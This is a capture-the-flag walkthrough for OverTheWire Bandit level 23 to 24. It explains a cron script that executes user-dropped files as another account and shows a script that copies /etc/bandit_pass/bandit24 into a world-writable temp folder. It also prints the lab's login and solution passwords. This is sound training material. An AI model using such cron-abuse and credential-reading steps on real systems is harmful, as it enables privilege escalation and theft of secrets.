# [Level 23 to 24](https://overthewire.org/wargames/bandit/bandit23.html) - Cronjobs and bash scripting

- Login
```
SSH: ssh bandit23@bandit.labs.overthewire.org -p 2220
Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
```
- Exercise: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level! NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
- Background:
  - chmod - change file mode bits
  - cron: job scheduler, most suitable for scheduling repetitive tasks
  - crond - daemon to execute scheduled commands
  - crontab - tables for driving cron
- Solution:
```bash
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
  - Script executes and deletes all files in `/var/spool/bandit24/foo` as `myname` has the value `bandit24`, for loop goes through the files, firs tif statement makes sure the directories `.` and `..` are ignored, inside the if statement is the code to execute a script but only if the owner is bandit23, then the file will be deleted
  - Create a file in `tmp` folder -> Prevents early deletion of the file, then move file to `/var/spool/bandit24/foo` and it will be executed
```bash
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.GcOCF7zgVZ
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.GcOCF7zgVZ
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ nano bandit24_pass.sh
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ cat bandit24_pass.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/tmp.GcOCF7zgVZ/password
```
  - Give the necessary permissions to the folder and the file and move the file into the correct folder
```bash
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ chmod +rx bandit24_pass.sh 
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ chmod 777 /tmp/tmp.GcOCF7zgVZ
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ touch password
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ chmod +rwx password 
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ ls -la
total 17016
drwxrwxrwx 2 bandit23 bandit23     4096 Feb  8 19:05 .
drwxrwx-wt 1 root     root     17412096 Feb  8 19:05 ..
-rwxrwxr-x 1 bandit23 bandit23       73 Feb  8 19:03 bandit24_pass.sh
-rwxrwxr-x 1 bandit23 bandit23        0 Feb  8 19:05 password
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ cp bandit24_pass.sh /var/spool/bandit24/foo/bandit24_pass.sh
bandit23@bandit:/tmp/tmp.GcOCF7zgVZ$ cat password
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```
- Password: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
